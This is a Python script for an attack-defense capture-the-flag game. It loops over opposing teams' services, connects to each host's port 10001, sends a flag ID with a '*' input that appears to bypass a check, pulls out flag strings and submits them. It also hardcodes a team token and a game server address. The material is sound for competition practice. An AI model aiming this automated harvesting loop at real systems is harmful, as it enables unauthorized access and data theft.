
#!/usr/bin/python

#assume the PCTF will depend on the swpag_client package: https://pypi.org/project/swpag-client/

from swpag_client import Team
import time
import json
import re
from pwn import *

class PCTFAPI():

    __slots__ = ('team')

    def __init__(self, game_url, team_token):
        self.team = Team(game_url, team_token) 

    def getServiceNames(self):

        service_ids = []
        services = self.team.get_service_list()

        for service in services:
            service_ids.append(service['service_id'])

        return service_ids
                

    def getTargets(self, service):
        targets = self.team.get_targets(service)
        return targets

    def getFLG(self, hostname, flagID):
        try:
            r=remote(hostname, 10001)
        except:
            print(hostname + ' is down ')
            return None
        
        r.sendline('2')
        r.sendline(flagID)
        r.sendline('*')

        rl=r.recvall(timeout=1)
        decoded_str = ''
        try:
            decoded_str = rl.decode('utf-8')
            print(decoded_str)
        except:
            print('bad response')
            return None
        m=re.search('FLG[0-9A-Za-z]{13}', decoded_str)
        if m==None:
            r.close()
            return None

        FLG=m.group(0)
        print('captured the flag')
        print(FLG)
        r.close()
        return FLG

    def submitFlag(self, flags):
        if not isinstance(flags, list):
            flags = [flags]
            
        status = self.team.submit_flag(flags)
        
        for i, s in enumerate(status):
            print("Flag %s submission status: %s" % (flags[i], s))
        
        return status


if __name__ == '__main__':	

    # input our team's token
    team_token = "WOfdkzdhsZEIlPEIai49"
    
    # This may change between CTFs
    game_url = "http://34.211.129.130"

    # Initialize PCTFAPI
    api = PCTFAPI(game_url, team_token)
    
    # Get all service names
    service_names = api.getServiceNames()
    
    # Get all targets for each service
    while True:
        for service in service_names:

            targets = api.getTargets(service)
        
            for target in targets:
                #TODO: implement some exploits to the target
                message = 'waiting for some exploits'
                #message = 'Submit test flag for service: ' + str(service) + ' and target: ' + json.dumps(target)
                print(message) 
                flag = api.getFLG(target.get("hostname"), target.get("flag_id"))
                if flag != None:
                    api.submitFlag(flag)

        # search flag every 3 minutes. Need to be adjusted during the game
        time.sleep(60)


